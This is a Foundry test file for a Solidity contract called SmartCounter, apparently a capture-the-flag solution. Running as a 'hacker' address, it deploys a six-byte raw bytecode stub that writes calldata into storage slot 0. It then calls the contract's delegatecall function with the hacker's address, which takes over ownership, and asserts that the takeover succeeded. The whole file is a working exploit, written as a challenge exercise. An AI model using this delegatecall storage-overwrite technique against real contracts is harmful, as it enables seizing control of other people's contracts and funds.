// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {SmartCounter, Deployer} from "../src/Counter.sol";

contract CounterTest is Test {
    SmartCounter internal target;

    address internal owner;
    address internal hacker;

    function setUp() public {
        owner = makeAddr("owner");
        hacker = makeAddr("hacker");

        target = new SmartCounter(owner);
    }

    function test_hack() public {
        console.log(abi.encodePacked(address(0)).length, "length");

        vm.startPrank(hacker);
        uint48 c = 0x600035600055;
        bytes memory code = abi.encodePacked(c);
        console.log(code.length, "code length");
        target.create(code);

        console.logBytes(target.target().code);
        console.log(target.owner());
        target.A_delegateccall(abi.encode(hacker));
        console.log(target.owner());
        vm.stopPrank();

        assertEq(hacker, target.owner());
    }
}
